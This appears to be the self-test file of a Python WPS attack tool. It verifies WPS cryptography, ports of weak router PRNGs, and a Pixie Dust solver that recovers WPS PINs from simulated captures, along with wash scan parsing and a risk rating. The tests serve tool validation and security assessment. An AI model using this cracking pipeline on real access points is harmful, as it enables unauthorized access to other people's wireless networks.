"""Built-in self-test (no external dependencies).

Run with ``python -m wps_attack selftest``.  Verifies:

1. AES-128 against the FIPS-197 test vector + CBC round-trip
2. WPS math: PIN checksum, PSK derivation, KDF/session-key chain,
   E-Hash, EncrSettings decrypt
3. PRNG ports: forward/backward inverse property (Ralink LFSR), glibc
   seed->nonce, eCos determinism
4. Simulator -> offline solver round-trip for every weak-PRNG mode
5. Negative control: secure random nonces must NOT yield a PIN
6. wash output parsing + risk analyzer sanity

Exit code 0 = all green.
"""

from __future__ import annotations

import secrets
import time
from typing import Callable, Optional

from . import crypto, prngs, wps
from .analyzer import analyze_ap, bruteforce_eta, score_rating
from .pixiedust import PixieSolver
from .scanner import parse_wash_output
from .simulator import ApConfig, simulated_capture

__all__ = ["run_selftest"]

_RESULTS: list[tuple[str, bool, str]] = []


def _check(name: str, fn: Callable[[], None]) -> None:
    t0 = time.time()
    try:
        fn()
        dt = time.time() - t0
        _RESULTS.append((name, True, f"{dt:.2f}s"))
        print(f"  [PASS] {name}  ({dt:.2f}s)")
    except Exception as exc:  # noqa: BLE001 - selftest reports all
        _RESULTS.append((name, False, repr(exc)))
        print(f"  [FAIL] {name}: {exc!r}")


# ---------------------------------------------------------------------------
# 1. AES
# ---------------------------------------------------------------------------

def _test_aes_fips197():
    key = bytes(range(0x00, 0x10))
    pt = bytes.fromhex("00112233445566778899aabbccddeeff")
    ct = crypto.aes128_cbc_encrypt(key, b"\x00" * 16, pt)
    assert ct.hex() == "69c4e0d86a7b0430d8cdb78070b4c55a", ct.hex()
    assert crypto.aes128_cbc_decrypt(key, b"\x00" * 16, ct) == pt
    # two-block raw CBC (the WPS layer adds PKCS#5 padding separately)
    block = crypto.aes128_cbc_encrypt(key, b"\x11" * 16, b"A" * 32)
    assert len(block) == 32 and block[16:] != block[:16]
    assert crypto.aes128_cbc_decrypt(key, b"\x11" * 16, block) == b"A" * 32


# ---------------------------------------------------------------------------
# 2. WPS math
# ---------------------------------------------------------------------------

def _test_wps_math():
    # canonical examples (identical to pixiewps' wps_pin_checksum)
    assert wps.wps_pin_checksum(1234567) == 0
    assert wps.wps_pin_checksum(9999999) == 5
    assert wps.wps_pin_checksum(0) == 0
    assert wps.wps_pin_valid("12345670") and not wps.wps_pin_valid("12345671")
    assert wps.wps_pin_valid("00000000") and wps.wps_pin_valid("99999995")
    n = 0
    for h1, h2 in wps.iter_p1_p2():
        pin = wps.complete_pin(h1, h2)
        assert wps.wps_pin_valid(pin), pin
        n += 1
    assert n == 10_000_000, n

    authkey = secrets.token_bytes(32)
    pin = "12345670"
    psk1, psk2 = wps.derive_psk(authkey, pin)
    assert psk1 == crypto.hmac_sha256(authkey, b"1234")[:16]
    assert psk2 == crypto.hmac_sha256(authkey, b"5670")[:16]
    assert wps.empty_psk(authkey) == crypto.hmac_sha256(authkey, b"")[:16]

    pke = secrets.token_bytes(192)
    pkr = secrets.token_bytes(192)
    es1, es2 = secrets.token_bytes(16), secrets.token_bytes(16)
    eh1 = wps.e_hash(authkey, es1, psk1, pke, pkr)
    eh2 = wps.e_hash(authkey, es2, psk2, pke, pkr)
    assert eh1 != eh2 and len(eh1) == 32

    # session-key chain: KDK = HMAC-SHA256(DHKey, E-Nonce||BSSID||R-Nonce)
    dhkey = crypto.sha256(b"\x01" * 192)
    enonce = secrets.token_bytes(16)
    rnonce = secrets.token_bytes(16)
    bssid = secrets.token_bytes(6)
    kdk = crypto.hmac_sha256(dhkey, enonce + bssid + rnonce)
    expect = crypto.wps_kdf(kdk, b"Wi-Fi Easy and Secure Key Derivation", 80)
    sk = wps.derive_session_keys(b"\x01" * 192, enonce, bssid, rnonce)
    assert sk.authkey == expect[:32]
    assert sk.wrapkey == expect[32:48]
    assert sk.emsk == expect[48:80]

    # EncrSettings decrypt round-trip (IV || ciphertext, PKCS#5 padding)
    data = b"\x10\x16" + b"\x00" * 16 + b"\x10\x45" + b"\x00\x04" + b"TEST"
    padded = data + bytes([16 - len(data) % 16]) * (16 - len(data) % 16)
    encr = b"\x00" * 16 + crypto.aes128_cbc_encrypt(
        sk.wrapkey, b"\x00" * 16, padded)
    assert wps.decrypt_encr_settings(sk.wrapkey, encr) == data


def _test_small_dh():
    # small-DH: PKE == 2 -> shared == 2^priv mod P5 (192B big-endian)
    assert wps.dh_shared_secret(b"\x00" * 191 + b"\x02", 5) == \
        (2 ** 5).to_bytes(192, "big")
    ap_priv = 12345
    expect = pow(2, ap_priv, int.from_bytes(wps.DH_GROUP5_PRIME, "big"))
    expect = expect.to_bytes(192, "big")
    assert wps.dh_shared_secret(b"\x00" * 191 + b"\x02", ap_priv) == expect


# ---------------------------------------------------------------------------
# 3. PRNG ports
# ---------------------------------------------------------------------------

def _test_ralink_lfsr():
    # Build a real E-S1 -> E-S2 -> nonce stream from a known state, then
    # verify the solver's exact reconstruction path:
    #   restore state from nonce -> forward 16 == nonce
    #   backward 16 == E-S2, next backward 16 == E-S1
    initial = 0x12345678
    es1, s = prngs.ralink_bytes_forward(initial, 16)
    es2, s = prngs.ralink_bytes_forward(s, 16)
    nonce, _s = prngs.ralink_bytes_forward(s, 16)

    restored = prngs.ralink_restore_state(nonce)
    out, _ = prngs.ralink_bytes_forward(restored, 16)
    assert out == nonce, "restore+forward must reproduce the nonce"

    s = restored
    b2 = bytearray(16)
    for i in range(15, -1, -1):
        b, s = prngs.ralink_backward_byte(s)
        b2[i] = b
    b1 = bytearray(16)
    for i in range(15, -1, -1):
        b, s = prngs.ralink_backward_byte(s)
        b1[i] = b
    assert bytes(b2) == es2, "backward 16 bytes must be E-S2"
    assert bytes(b1) == es1, "next backward 16 bytes must be E-S1"


def _test_glibc():
    import struct
    seed = 1234567890
    nonce = prngs.glibc_fast_nonce(seed)
    # fast_seed must equal the big-endian first word of fast_nonce
    assert prngs.glibc_fast_seed(seed) == struct.unpack(">I", nonce[0:4])[0]
    # all four words are 31-bit (glibc rand returns non-negative ints)
    for w in struct.unpack(">4I", nonce):
        assert w & 0x80000000 == 0
    assert prngs.rtl_nonce_fill(seed) == nonce
    # different seeds -> different nonces
    assert prngs.glibc_fast_nonce(seed + 1) != nonce
    # cross-check against the real glibc srand()/rand() when available
    try:
        import ctypes
        libc = ctypes.CDLL(None)
        libc.srand(ctypes.c_uint(seed))
        libc.rand.restype = ctypes.c_uint
        libc.srand.argtypes = [ctypes.c_uint]
        expected = [libc.rand() for _ in range(4)]
        assert list(struct.unpack(">4I", nonce)) == expected, (
            [hex(v) for v in expected], [hex(v) for v in
                                         struct.unpack(">4I", nonce)])
    except (OSError, AttributeError):
        pass  # no libc/rand available (Windows) — table model still checked


def _test_ecos():
    for fn in (prngs.ecos_rand_simplest, prngs.ecos_rand_simple):
        a, b = fn(12345), fn(12345)
        assert a == b
    assert prngs.ecos_rand_knuth(12345) == prngs.ecos_rand_knuth(12345)
    assert prngs.ecos_rand_knuth(1) != prngs.ecos_rand_knuth(2)


# ---------------------------------------------------------------------------
# 4. simulate -> crack round-trip
# ---------------------------------------------------------------------------

def _roundtrip(prng_mode: str, seed: int = 1_650_000_000, pin: str = "12345670",
               use_rtl_fixed: Optional[bool] = None,
               explicit_mode: Optional[int] = None,
               ec_limit: Optional[int] = None) -> None:
    cfg = ApConfig(pin=pin, prng_mode=prng_mode, seed=seed,
                   use_rtl_fixed_key=use_rtl_fixed)
    sim = simulated_capture(cfg)
    solver = PixieSolver(sim.capture, progress=lambda m: None)
    if explicit_mode is not None:
        # ECOS_SIMPLEST/KNUTH are not in the auto list (full 32-bit scans);
        # the solver needs them selected explicitly, like pixiewps --mode.
        res = solver.auto(modes=[explicit_mode], ec_limit=ec_limit)
    else:
        res = solver.auto()
    assert res.found, f"{prng_mode}: solver failed to find PIN"
    assert res.pin == pin, f"{prng_mode}: got {res.pin}, want {pin}"


def _test_roundtrip_rtl819x():
    # seed within the default +/-1 day window around "now"
    import time as _t
    _roundtrip("rtl819x", seed=int(_t.time()) - 3600)


def _test_roundtrip_rt():
    _roundtrip("rt")


def _test_roundtrip_ecos_simplest():
    _roundtrip("ecos-simplest", seed=0x001A2B3C,
               explicit_mode=prngs.ECOS_SIMPLEST, ec_limit=0x001A2B3C + 1)


def _test_roundtrip_ecos_knuth():
    _roundtrip("ecos-knuth", seed=0x00F00D5E,
               explicit_mode=prngs.ECOS_KNUTH, ec_limit=0x00F00D5E + 1)


def _test_roundtrip_ecos_simple():
    _roundtrip("ecos-simple", seed=1_700_000_123)


def _test_roundtrip_zero_and_clone():
    for mode in ("zero", "nonce-clone"):
        cfg = ApConfig(pin="00000000", prng_mode=mode, seed=42,
                       use_rtl_fixed_key=False)
        sim = simulated_capture(cfg)
        solver = PixieSolver(sim.capture, progress=lambda m: None)
        res = solver.auto()
        assert res.found and res.pin == "00000000", (mode, res)


def _test_negative_control():
    cfg = ApConfig(pin="12345670", prng_mode="random", seed=42,
                   use_rtl_fixed_key=False)
    sim = simulated_capture(cfg)
    solver = PixieSolver(sim.capture, progress=lambda m: None)
    res = solver.auto(modes=[prngs.RT, prngs.ECOS_SIMPLEST, prngs.ECOS_KNUTH],
                      ec_limit=1 << 16)
    assert not res.found, "secure random nonces must not yield a PIN"


# ---------------------------------------------------------------------------
# 5. scan parse + analyzer
# ---------------------------------------------------------------------------

_WASH_SAMPLE = """\
    BSSID     Channel   WPS   Locked  Pin         R #     Signal      UUID    SSID
    00:11:22:33:44:55     6   Y       N       12345670      1 0     -50 dBm  462a72b6-6345-4111-a199-001122334455  CoffeeShop
    aa:bb:cc:dd:ee:ff     11  Y       Y       -             0 0     -70 dBm  462a72b6-6345-4111-a199-001122334455  LockedAP
"""


def _test_wash_parse():
    aps = parse_wash_output(_WASH_SAMPLE)
    assert len(aps) == 2, aps
    assert aps[0].bssid == "00:11:22:33:44:55"
    assert aps[0].pin == "12345670"
    assert aps[1].locked and aps[1].pin is None
    assert aps[0].channel == 6 and aps[0].signal_dbm == -50
    assert aps[0].ssid == "CoffeeShop"


def _test_analyzer():
    aps = parse_wash_output(_WASH_SAMPLE)
    a1 = analyze_ap(aps[0], pin="12345670", pixie_success=True, rekey=False)
    assert a1.rating == "CRITICAL", a1.rating
    # WPS on + currently locked: only a temporary mitigation
    a2 = analyze_ap(aps[1])
    assert a2.rating in ("LOW", "MEDIUM"), a2.rating
    a3 = analyze_ap(None)
    assert a3.rating in ("NONE", "LOW")
    eta, eta_human = bruteforce_eta()
    assert eta > 0 and "days" in eta_human


# ---------------------------------------------------------------------------

def run_selftest(verbose: bool = True) -> int:
    print("WiFi-WPS-Attack-Tool self-test")
    print(f"  AES backend: {crypto.CryptoBackend.name}")
    print()
    print("crypto:")
    _check("AES-128 FIPS-197 vector + CBC", _test_aes_fips197)
    print("wps math:")
    _check("PIN checksum / valid / 10^7 candidates", _test_wps_math)
    _check("small-DH shared secret", _test_small_dh)
    print("prng ports:")
    _check("Ralink LFSR forward/backward/restore", _test_ralink_lfsr)
    _check("glibc srand/rand chain", _test_glibc)
    _check("eCos LCGs deterministic", _test_ecos)
    print("simulator -> offline solver round-trip:")
    _check("RTL819x (glibc rand)", _test_roundtrip_rtl819x)
    _check("Ralink (LFSR)", _test_roundtrip_rt)
    _check("eCos simplest LCG", _test_roundtrip_ecos_simplest)
    _check("eCos Knuth minstd", _test_roundtrip_ecos_knuth)
    _check("eCos simple LCG (2^25 scan)", _test_roundtrip_ecos_simple)
    _check("zero / nonce-clone special cases", _test_roundtrip_zero_and_clone)
    _check("negative control (random nonces)", _test_negative_control)
    print("scan + analysis:")
    _check("wash output parsing", _test_wash_parse)
    _check("risk analyzer", _test_analyzer)

    passed = sum(1 for _, ok, _ in _RESULTS if ok)
    total = len(_RESULTS)
    print()
    print(f"  {passed}/{total} checks passed")
    if passed != total:
        print("  FAILED:")
        for name, ok, err in _RESULTS:
            if not ok:
                print(f"    - {name}: {err}")
        return 1
    return 0


def main(argv=None) -> int:
    return run_selftest()
